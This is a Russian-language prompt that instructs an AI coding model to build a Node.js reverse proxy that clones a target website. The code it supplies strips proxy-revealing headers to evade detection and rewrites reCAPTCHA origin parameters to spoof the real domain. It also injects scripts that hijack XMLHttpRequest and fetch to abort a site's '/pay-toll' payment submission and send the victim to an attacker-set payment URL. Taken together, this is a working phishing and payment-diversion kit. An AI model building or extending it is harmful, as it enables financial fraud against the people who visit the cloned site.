# Универсальный промпт для создания Reverse Proxy с обходом защит

## Описание задачи

Создай полнофункциональный reverse proxy сервер на Node.js с Express, который:
1. Прозрачно проксирует запросы к целевому сайту
2. Обходит все возможные защиты и детектирование прокси
3. Инжектирует кастомные скрипты в HTML страницы
4. Заменяет домены в контенте для сохранения пользователей на прокси
5. Обрабатывает все типы запросов (GET, POST, PUT, DELETE, WebSocket)
6. Работает на мобильных и десктопных устройствах

---

## Архитектура и технологии

### Основные зависимости:
- `express` - веб-фреймворк
- `http-proxy-middleware` - проксирование запросов (версия 3.x с поддержкой `responseInterceptor`)
- `express-ws` - поддержка WebSocket
- `cookie-parser` - обработка cookies
- `helmet` - безопасность (с ослабленными настройками для прокси)
- `morgan` - логирование запросов
- `express-rate-limit` - ограничение частоты запросов
- `winston` + `winston-daily-rotate-file` - продвинутое логирование
- `node-cache` - кэширование ответов
- `dotenv` - переменные окружения

### Структура проекта:
```
project/
├── server.js          # Основной файл прокси
├── config.js          # Конфигурация
├── logger.js          # Логирование
├── cache-manager.js   # Управление кэшем
├── user-agents.js     # Ротация User-Agent
├── package.json
├── .env               # Переменные окружения
└── .gitignore
```

---

## Критические проблемы и их решения

### ПРОБЛЕМА 1: CDN/Edge Cache блокирует инжекцию скриптов

**Симптомы:**
- Скрипты не инжектятся в HTML
- Старые версии страниц отдаются из кэша
- Изменения не применяются

**РЕШЕНИЕ - Многоуровневый обход кэша:**

1. **На уровне запроса (onProxyReq):**
   ```javascript
   // Удалить условные заголовки для предотвращения 304 ответов
   proxyReq.removeHeader('If-None-Match');
   proxyReq.removeHeader('If-Modified-Since');
   
   // Принудительно запросить свежий контент
   proxyReq.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
   proxyReq.setHeader('Pragma', 'no-cache');
   ```

2. **Добавление уникального параметра к HTML запросам:**
   ```javascript
   app.use((req, res, next) => {
     if (req.method === 'GET' && !req.query._nocache) {
       const acceptsHtml = req.headers.accept && req.headers.accept.includes('text/html');
       if (acceptsHtml) {
         const separator = req.url.includes('?') ? '&' : '?';
         req.url = req.url + separator + '_nocache=' + Date.now();
       }
     }
     next();
   });
   ```

3. **На уровне ответа (responseInterceptor):**
   ```javascript
   // Множественные заголовки для отключения кэша
   res.setHeader('Cache-Control', 'private, no-cache, no-store, must-revalidate, max-age=0, s-maxage=0');
   res.setHeader('Surrogate-Control', 'no-store'); // CDN-specific
   res.setHeader('Pragma', 'no-cache');
   res.setHeader('Expires', '0');
   res.setHeader('Vary', '*'); // Вариация по всем заголовкам = отключение кэша
   res.setHeader('X-Railway-No-Cache', '1'); // Кастомный заголовок
   res.setHeader('X-Content-Cache', 'DISABLED');
   
   // Удалить заголовки кэширования
   res.removeHeader('ETag');
   res.removeHeader('Last-Modified');
   ```

---

### ПРОБЛЕМА 2: reCAPTCHA не работает из-за другого домена

**Симптомы:**
- reCAPTCHA показывает ошибку домена
- Платежи не проходят из-за невалидной reCAPTCHA

**РЕШЕНИЕ - Перехват и исправление reCAPTCHA запросов:**

```javascript
// Инжектировать в начало <head>
const recaptchaFixScript = `
<script>
(function() {
  const originalFetch = window.fetch;
  const targetOrigin = '${TARGET_URL}'; // Оригинальный домен
  const proxyOrigin = '${PROXY_URL}';   // Домен прокси
  
  // Кодирование для параметра 'co' в reCAPTCHA
  const targetBase64 = Buffer.from(\`\${targetOrigin}:443\`).toString('base64').replace(/=/g, '.');
  const proxyBase64 = Buffer.from(\`\${proxyOrigin}:443\`).toString('base64').replace(/=/g, '.');
  
  window.fetch = function(...args) {
    let url = args[0];
    if (typeof url === 'string' && url.includes('google.com/recaptcha')) {
      // Заменить прокси домен на оригинальный в параметре co
      url = url.replace(new RegExp(\`co=\${proxyBase64}\`, 'g'), \`co=\${targetBase64}\`);
      args[0] = url;
    }
    return originalFetch.apply(this, args);
  };
})();
</script>`;
```

---

### ПРОБЛЕМА 3: Редирект на платёжную систему не работает на мобильных

**Симптомы:**
- На десктопе всё работает
- На мобильных редирект не происходит или блокируется

**РЕШЕНИЕ - Определение устройства и адаптивный редирект:**

```javascript
// Определение мобильного устройства
function isMobileDevice() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
         (window.innerWidth <= 768 && window.innerHeight <= 1024) ||
         ('ontouchstart' in window) ||
         (navigator.maxTouchPoints > 0);
}

const isMobile = isMobileDevice();

// Универсальная функция редиректа
function redirectToPayment(amount) {
  const paymentUrl = PAYMENT_URL + '?amount=' + amount;
  
  if (isMobile) {
    // МОБИЛЬНЫЕ: Прямая навигация (window.location.href)
    // window.open() часто блокируется на мобильных
    window.location.href = paymentUrl;
  } else {
    // ДЕСКТОП: Открытие в новой вкладке
    const paymentWindow = window.open(paymentUrl, '_blank');
    if (!paymentWindow) {
      // Fallback: если popup заблокирован
      window.location.href = paymentUrl;
    }
  }
  return true;
}
```

---

### ПРОБЛЕМА 4: AJAX запросы уходят на оригинальный домен

**Симптомы:**
- Формы отправляются на оригинальный сайт
- Пользователь перенаправляется с прокси

**РЕШЕНИЕ - Низкоуровневый перехват XMLHttpRequest и Fetch:**

```javascript
// Перехват ДО загрузки jQuery/Drupal/других библиотек
const originalXHROpen = XMLHttpRequest.prototype.open;
const originalXHRSend = XMLHttpRequest.prototype.send;
const originalFetch = window.fetch;

// Перехват XMLHttpRequest.open для отслеживания URL
XMLHttpRequest.prototype.open = function(method, url) {
  this._interceptedMethod = method;
  this._interceptedURL = url;
  return originalXHROpen.apply(this, arguments);
};

// Перехват XMLHttpRequest.send для блокировки запросов
XMLHttpRequest.prototype.send = function(body) {
  const bodyStr = body ? body.toString() : '';
  
  // Определить, является ли это финальным запросом оплаты
  if (
    this._interceptedMethod === 'POST' &&
    this._interceptedURL &&
    (this._interceptedURL.includes('/pay-toll') || 
     this._interceptedURL.includes('ajax_form=1'))
  ) {
    const hasTotalPayment = bodyStr.includes('total_payment=');
    const isFinalPayButton = bodyStr.includes('_triggering_element_value=Pay') && 
                            !bodyStr.includes('_triggering_element_value=Pay+');
    
    if (hasTotalPayment && isFinalPayButton && !redirectInProgress) {
      // БЛОКИРОВАТЬ запрос ДО отправки reCAPTCHA
      redirectInProgress = true;
      this.abort(); // Критически важно: отменить запрос
      
      // Извлечь сумму из body запроса
      const bodyAmountMatch = bodyStr.match(/total_payment=([\d.]+)/);
      const amount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : extractAmount();
      
      if (amount && parseFloat(amount) > 0) {
        redirectToPayment(amount);
      }
      
      return; // Не отправлять запрос
    }
  }
  
  return originalXHRSend.apply(this, arguments);
};

// Перехват Fetch API (резервный метод)
window.fetch = function(url, options) {
  const urlStr = typeof url === 'string' ? url : url.toString();
  
  if (
    options &&
    options.method === 'POST' &&
    (urlStr.includes('/pay-toll') || urlStr.includes('ajax_form=1'))
  ) {
    const bodyStr = options.body ? options.body.toString() : '';
    const hasTotalPayment = bodyStr.includes('total_payment=');
    const isFinalSubmit = bodyStr.includes('_triggering_element_value=Pay');
    
    if (hasTotalPayment && isFinalSubmit) {
      // Блокировать и редиректить
      const bodyAmountMatch = bodyStr.match(/total_payment=([\d.]+)/);
      const amount = bodyAmountMatch && bodyAmountMatch[1] : extractAmount();
      
      if (amount && parseFloat(amount) > 0) {
        redirectToPayment(amount);
        return Promise.reject(new Error('Redirected to payment system'));
      }
    }
  }
  
  return originalFetch.apply(this, arguments);
};
```

**КРИТИЧЕСКИ ВАЖНО:**
- Скрипт должен инжектироваться в САМОЕ НАЧАЛО `<head>` ДО загрузки других скриптов
- Использовать `selfHandleResponse: true` в http-proxy-middleware
- Использовать `responseInterceptor` для обработки ответов

---

### ПРОБЛЕМА 5: Домены в контенте не заменяются

**Симптомы:**
- Ссылки ведут на оригинальный сайт
- AJAX запросы идут на оригинальный домен
- Изображения и ресурсы не загружаются

**РЕШЕНИЕ - Множественная замена доменов:**

```javascript
const targetDomain = new URL(config.target.url).hostname; // example.com
const proxyDomain = req.get('host'); // proxy.example.com

// Замена ВСЕХ вариантов домена
bodyString = bodyString.replace(
  new RegExp(`http://${targetDomain}`, 'gi'),
  `https://${proxyDomain}`
);

bodyString = bodyString.replace(
  new RegExp(`https://${targetDomain}`, 'gi'),
  `https://${proxyDomain}`
);

bodyString = bodyString.replace(
  new RegExp(`http://www\\.${targetDomain}`, 'gi'),
  `https://${proxyDomain}`
);

bodyString = bodyString.replace(
  new RegExp(`https://www\\.${targetDomain}`, 'gi'),
  `https://${proxyDomain}`
);

// Замена домена в атрибутах (href, src, data-url и т.д.)
bodyString = bodyString.replace(
  new RegExp(`(["\'])${targetDomain}`, 'gi'),
  `$1${proxyDomain}`
);
```

**Применять к:**
- `text/html`
- `application/javascript`
- `text/css`
- `application/json`

---

### ПРОБЛЕМА 6: Fingerprinting и детектирование прокси

**Симптомы:**
- Сайт определяет, что используется прокси
- Запросы блокируются
- Показываются ошибки безопасности

**РЕШЕНИЕ - Удаление всех следов проксирования:**

```javascript
onProxyReq: (proxyReq, req, res) => {
  // Удалить заголовки, которые выдают прокси
  proxyReq.removeHeader('X-Forwarded-For');
  proxyReq.removeHeader('X-Forwarded-Host');
  proxyReq.removeHeader('X-Forwarded-Proto');
  proxyReq.removeHeader('X-Real-IP');
  proxyReq.removeHeader('Via');
  proxyReq.removeHeader('Forwarded');
  
  // Удалить заголовки rate limiting
  proxyReq.removeHeader('RateLimit');
  proxyReq.removeHeader('RateLimit-Policy');
  proxyReq.removeHeader('RateLimit-Limit');
  proxyReq.removeHeader('RateLimit-Remaining');
  proxyReq.removeHeader('RateLimit-Reset');
  
  // Ротация User-Agent для имитации разных браузеров
  if (req.randomUserAgent) {
    proxyReq.setHeader('User-Agent', req.randomUserAgent);
  }
  
  // Установить реалистичные Accept заголовки
  if (!proxyReq.getHeader('Accept')) {
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
  }
  if (!proxyReq.getHeader('Accept-Language')) {
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.9');
  }
  if (!proxyReq.getHeader('Accept-Encoding')) {
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
  }
}
```

---

## Конфигурация прокси

### Основные настройки http-proxy-middleware:

```javascript
const proxyOptions = {
  target: config.target.url,           // Целевой URL
  changeOrigin: true,                  // Изменить Origin заголовок
  ws: config.features.websocket,        // Поддержка WebSocket
  timeout: config.target.timeout,       // Таймаут запросов
  proxyTimeout: config.target.timeout,
  
  // КРИТИЧЕСКИ ВАЖНО:
  parseReqBody: true,                  // Парсить body для перехвата
  selfHandleResponse: true,             // Самостоятельная обработка ответов
  
  // Переписывание cookies
  cookieDomainRewrite: { '*': '' },
  cookiePathRewrite: { '*': '/' },
  
  // Автоматическое переписывание редиректов
  autoRewrite: true,
  followRedirects: true,
  
  // Сохранить регистр заголовков
  preserveHeaderKeyCase: true,
  
  // Обработка запросов
  onProxyReq: (proxyReq, req, res) => {
    // ... логика обработки запросов
  },
  
  // Обработка ответов через responseInterceptor
  on: {
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      // ... логика обработки ответов
    }),
    
    error: (err, req, res) => {
      // Обработка ошибок
    }
  }
};
```

---

## Инжекция скриптов

### Критически важные моменты:

1. **Время инжекции:**
   - Скрипты ДОЛЖНЫ выполняться ДО загрузки jQuery, Drupal, React и других библиотек
   - Инжектировать в самое начало `<head>`

2. **Порядок инжекции:**
   ```javascript
   // Приоритет 1: После <head>
   if (bodyString.includes('<head>')) {
     bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
   }
   // Приоритет 2: После <head с атрибутами>
   else if (bodyString.includes('<head ')) {
     bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
   }
   // Приоритет 3: Перед </head>
   else if (bodyString.includes('</head>')) {
     bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
   }
   // Приоритет 4: Перед первым <script>
   else if (bodyString.includes('<script')) {
     bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
   }
   ```

3. **Проверка инжекции:**
   ```javascript
   res.setHeader('X-Script-Injected', 'yes'); // Для отладки
   ```

---

## Обработка cookies

### Проблемы с cookies:
- Cookies привязаны к домену
- Secure flag требует HTTPS
- SameSite политики

### Решение:

```javascript
if (proxyRes.headers['set-cookie']) {
  const cookies = proxyRes.headers['set-cookie'].map((cookie) => {
    let modifiedCookie = cookie;
    
    // Удалить Secure flag для локальной разработки (HTTP)
    if (req.protocol === 'http') {
      modifiedCookie = modifiedCookie.replace(/;\s*Secure/gi, '');
    }
    
    // Переписать домен если установлен кастомный домен
    if (config.customDomain) {
      const targetDomain = new URL(config.target.url).hostname;
      modifiedCookie = modifiedCookie.replace(
        new RegExp(`Domain=${targetDomain}`, 'gi'),
        `Domain=${config.customDomain}`
      );
    }
    
    return modifiedCookie;
  });
  
  res.setHeader('set-cookie', cookies);
}
```

---

## Кэширование ответов

### Умное кэширование:

```javascript
// Кэшировать только GET запросы со статусом 200
function shouldCache(req, res) {
  if (req.method !== 'GET') return false;
  if (res.statusCode !== 200) return false;
  
  // Не кэшировать динамические/персональные эндпоинты
  const noCachePaths = ['/user/', '/account/', '/api/auth', '/login', '/logout'];
  for (const path of noCachePaths) {
    if (req.url.includes(path)) return false;
  }
  
  return true;
}

// Разные TTL для разных типов контента
let cacheTTL = 300; // 5 минут по умолчанию

if (req.url.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot)$/)) {
  cacheTTL = 3600; // 1 час для статических файлов
}

if (req.url.endsWith('/') || req.url.endsWith('.html')) {
  cacheTTL = 180; // 3 минуты для HTML
}
```

**ВАЖНО:** HTML страницы с инжектированными скриптами НЕ должны кэшироваться!

---

## WebSocket поддержка

```javascript
if (config.features.websocket) {
  expressWs(app);
  
  app.ws('/*', (ws, req) => {
    const WebSocket = require('ws');
    const targetUrl = config.target.url.replace('http', 'ws') + req.url;
    const proxyWs = new WebSocket(targetUrl, {
      headers: {
        'Origin': config.target.url,
        'User-Agent': req.headers['user-agent'],
      },
    });
    
    // Двусторонняя пересылка сообщений
    ws.on('message', (msg) => {
      if (proxyWs.readyState === WebSocket.OPEN) {
        proxyWs.send(msg);
      }
    });
    
    proxyWs.on('message', (msg) => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
      }
    });
    
    // Обработка ошибок и закрытия
    proxyWs.on('error', (err) => ws.close());
    ws.on('error', (err) => proxyWs.close());
    proxyWs.on('close', () => ws.close());
    ws.on('close', () => proxyWs.close());
  });
}
```

---

## Безопасность и защита

### Helmet с ослабленными настройками:

```javascript
app.use(
  helmet({
    contentSecurityPolicy: false,        // Отключить CSP для прокси
    crossOriginEmbedderPolicy: false,    // Разрешить встраивание
    crossOriginOpenerPolicy: false,      // Разрешить открытие окон
    crossOriginResourcePolicy: false,    // Разрешить ресурсы
  })
);
```

### Rate Limiting (имитация обычного пользователя):

```javascript
const limiter = rateLimit({
  windowMs: 60 * 1000,        // 1 минута
  max: process.env.NODE_ENV === 'production' ? 30 : 60,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  skip: (req) => {
    // Пропустить статические ресурсы и health checks
    if (req.url === '/health' || req.url === '/cache-stats') return true;
    return req.url.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot)$/);
  },
});
```

---

## Логирование

### Структурированное логирование с Winston:

```javascript
const logger = winston.createLogger({
  level: config.logging.level,
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    new DailyRotateFile({
      filename: 'logs/app-%DATE%.log',
      datePattern: 'YYYY-MM-DD',
      maxSize: '20m',
      maxFiles: '14d',
    }),
    new DailyRotateFile({
      level: 'error',
      filename: 'logs/error-%DATE%.log',
      datePattern: 'YYYY-MM-DD',
      maxSize: '20m',
      maxFiles: '30d',
    }),
  ],
});
```

---

## Переменные окружения (.env)

```env
# Целевой сайт
TARGET_URL=https://example.com

# Прокси настройки
PORT=3000
HOST=0.0.0.0
TRUST_PROXY=true

# Таймауты
PROXY_TIMEOUT=30000

# Логирование
LOG_LEVEL=info
LOG_REQUESTS=true
LOG_RESPONSES=false
LOG_DIR=./logs

# Функции
ENABLE_COMPRESSION=false
ENABLE_WEBSOCKET=true

# Кастомный домен (опционально)
CUSTOM_DOMAIN=

# URL платёжной системы (для редиректа)
PAYMENT_SYSTEM_URL=https://payment.example.com
```

---

## Деплой на Railway/Heroku/Vercel

### Railway специфичные настройки:

1. **Обход Railway Edge Cache:**
   - Использовать все методы обхода кэша из раздела "ПРОБЛЕМА 1"
   - Добавить кастомные заголовки `X-Railway-No-Cache`

2. **Trust Proxy:**
   ```javascript
   trustProxy: process.env.TRUST_PROXY === 'true' || 
               process.env.NODE_ENV === 'production' || 
               true
   ```

3. **Dockerfile (если нужен):**
   ```dockerfile
   FROM node:18-alpine
   WORKDIR /app
   COPY package*.json ./
   RUN npm ci --only=production
   COPY . .
   EXPOSE 3000
   CMD ["node", "server.js"]
   ```

---

## Чеклист реализации

- [ ] Настроен http-proxy-middleware с `selfHandleResponse: true`
- [ ] Реализован `responseInterceptor` для обработки ответов
- [ ] Добавлен обход кэша на всех уровнях (запрос, ответ, параметры)
- [ ] Реализована замена доменов в HTML/JS/CSS/JSON
- [ ] Инжекция скриптов в начало `<head>`
- [ ] Низкоуровневый перехват XMLHttpRequest и Fetch
- [ ] Определение мобильных устройств и адаптивный редирект
- [ ] Исправление reCAPTCHA через перехват fetch
- [ ] Удаление всех fingerprinting заголовков
- [ ] Ротация User-Agent
- [ ] Обработка cookies с переписыванием домена
- [ ] Поддержка WebSocket
- [ ] Логирование всех операций
- [ ] Кэширование статических ресурсов (но НЕ HTML)
- [ ] Rate limiting для имитации обычного пользователя
- [ ] Graceful shutdown
- [ ] Health check эндпоинт

---

## Отладка

### Полезные заголовки для отладки:

```javascript
res.setHeader('X-Proxy-Interceptor', 'active');      // Подтверждение работы interceptor
res.setHeader('X-Script-Injected', 'yes');            // Подтверждение инжекции скриптов
res.setHeader('X-Cache', cached ? 'HIT' : 'MISS');    // Статус кэша
```

### Логирование критических операций:

```javascript
logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}`);
logger.info(`[CONTENT REWRITING] Processing ${contentType} for ${req.url}`);
logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
logger.debug(`[Cache Bypass] Added _nocache parameter to ${req.url}`);
```

---

## Заключение

Этот промпт содержит все необходимые знания для создания полнофункционального reverse proxy с обходом защит. Ключевые моменты:

1. **Кэширование** - главный враг инжекции скриптов, требует многоуровневого обхода
2. **Время выполнения** - скрипты должны выполняться ДО загрузки других библиотек
3. **Низкоуровневый перехват** - XMLHttpRequest и Fetch должны перехватываться на уровне прототипов
4. **Мобильная совместимость** - использовать `window.location.href` вместо `window.open()` на мобильных
5. **Замена доменов** - критически важно для сохранения пользователей на прокси
6. **Fingerprinting** - удалять все заголовки, которые выдают прокси

Следуя этому промпту, можно создать универсальный reverse proxy для любого сайта.





